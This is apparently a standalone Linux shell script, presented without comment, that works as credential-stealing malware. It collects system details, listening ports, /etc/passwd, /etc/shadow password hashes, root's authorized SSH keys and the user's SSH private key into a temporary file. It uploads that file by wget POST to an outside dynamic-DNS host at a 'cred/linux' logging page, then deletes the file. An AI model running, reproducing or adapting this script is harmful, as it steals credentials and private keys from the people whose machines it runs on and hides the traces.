wget -qO- http://ipinfo.io/ip > /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ wget -qO- http://ipinfo.io/ ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
wget -qO- http://ipinfo.io/ >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt


echo '' >> /tmp/info.txt
echo '==========[ cat /etc/issue ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat /etc/issue >>/tmp/info.txt >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt

echo '' >> /tmp/info.txt
echo '==========[ cat /proc/version ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat /proc/version >>/tmp/info.txt >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt

echo '' >> /tmp/info.txt
echo '==========[ cat /etc/*-release ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat /etc/*-release >>/tmp/info.txt >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt


echo '' >> /tmp/info.txt
echo '==========[ cat /proc/meminfo | head -n 2 ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat /proc/meminfo | head -n 2 >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt

echo '' >> /tmp/info.txt
echo '==========[ cat /proc/cpuinfo | grep model\ name | head -n 1 ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat /proc/cpuinfo | grep model\ name | head -n 1 >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt

echo '' >> /tmp/info.txt
echo '==========[ grep -c ^processor /proc/cpuinfo ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
grep -c ^processor /proc/cpuinfo >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt

echo '' >> /tmp/info.txt
echo '==========[ df -h ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
df -h >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt


echo '' >> /tmp/info.txt
echo '==========[ cat /root/.ssh/authorized_keys ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat /root/.ssh/authorized_keys >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt

echo '' >> /tmp/info.txt
echo '==========[ cat ~/.ssh/id_rsa.pub ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat ~/.ssh/id_rsa.pub >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt

echo '' >> /tmp/info.txt
echo '==========[ cat ~/.ssh/id_rsa ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat ~/.ssh/id_rsa >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt




echo '' >> /tmp/info.txt
echo '==========[ netstat -tlpn ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
netstat -tlpn >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt

echo '' >> /tmp/info.txt
echo '==========[ cat /etc/passwd ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat /etc/passwd >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt


echo '' >> /tmp/info.txt
echo '==========[ cat /etc/shadow ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat /etc/shadow >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt

echo '' >> /tmp/info.txt
echo '==========[ cat /etc/hosts ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat /etc/hosts >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt

echo '' >> /tmp/info.txt
echo '==========[ ifconfig ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat /etc/hosts >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt

echo '' >> /tmp/info.txt
echo '==========[ ip addr ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
cat /etc/hosts >> /tmp/info.txt
echo '' >> /tmp/info.txt
echo '==========[ ########### ]========' >> /tmp/info.txt


echo '' >> /tmp/info.txt
echo '==========[ ifconfig ]========' >> /tmp/info.txt
echo '' >> /tmp/info.txt
ifconfig >> /tmp/info.txt
echo '' >> /tmp/info.txt




# wget -qO- --post-file /tmp/info.txt http://192.168.1.105/bot/index.php
wget -qO- --post-file /tmp/info.txt http://j3j.duckdns.org/cred/linux/linux-log.php
rm -rf /tmp/info.txt
